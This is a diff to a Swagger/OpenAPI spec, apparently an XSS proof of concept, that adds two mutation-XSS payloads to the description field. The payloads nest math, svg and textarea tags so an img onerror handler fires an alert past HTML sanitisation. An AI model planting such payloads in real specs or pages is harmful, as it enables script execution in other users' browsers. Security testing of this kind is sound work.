@@ -4,4 +4,5 @@ info:
   title: Agora Swagger XSS
   description:
     <h4>xss</h4>
-   <a href="javascript:alert(1)">test</a>
+   <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
+   <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(1)'>">
